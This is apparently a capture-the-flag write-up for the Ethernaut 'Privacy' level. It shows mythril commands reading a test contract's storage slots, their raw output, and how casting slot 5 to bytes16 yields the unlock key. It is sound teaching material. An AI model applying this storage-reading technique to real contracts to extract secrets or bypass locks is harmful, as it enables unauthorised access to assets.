# Privacy

The creator of this contract was careful enough to protect the sensitive areas of its storage.<br/>
Unlock this contract to beat the level.<br/>

Things that might help:<br/>

- Understanding how storage works<br/>
- Understanding how parameter parsing works<br/>
- Understanding how casting works<br/>

**Tips:** <br/>
Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.<br/>

The Privacy contract store the sensitive data during constructor.We can use web3 to read storage to see slot of `bytes32[3] private data` value. See [web3 solution](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Privacy/getStorage.js) or use [mythril](https://github.com/ConsenSys/mythril) to read storage.

### Mythril usage:

```shell
myth read-storage --rpc infura-[network] slot_number contract_addr
```

Read storage from slot 0,6:
```shell
 myth read-storage 0,6 0x71B36F81241A21Ba0712190D5Fd637085d18Db80 --rpc infura-rinkeby --infura-i
d="YOUR_INFURA_ID"
0x0: 0x0000000000000000000000000000000000000000000000000000000000000000
0x1: 0x00000000000000000000000000000000000000000000000000000000623728e8
0x2: 0x0000000000000000000000000000000000000000000000000000000028e8ff0a
0x3: 0x3809c1b6af00ce53bffe1fe85bbe005b489d69e276899b8922504cd3764fc6c7
0x4: 0xa952766b53db2509e7e6d344a103a4900e16f90a18b5ee17b4b7bd9ae48fe736
0x5: 0x621e4f9c9fce7ccc4829660be3ae726a0bee35eda2d34f2381083f76e5b25ffb
```

Read storage only slot 5:
```shell
myth read-storage 5 0x71B36F81241A21Ba0712190D5Fd637085d18Db80 --rpc infura-rinkeby --infura-id=
"YOUR_INFURA_ID"
5: 0x621e4f9c9fce7ccc4829660be3ae726a0bee35eda2d34f2381083f76e5b25ffb
```

After we got slot `data` value 0x621e4f9c9fce7ccc4829660be3ae726a0bee35eda2d34f2381083f76e5b25ffb, we need to convert type from byte32 to byte16 because `_key` is last index array in data[2].See the [exploit solution](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Privacy/privacyAttack.sol)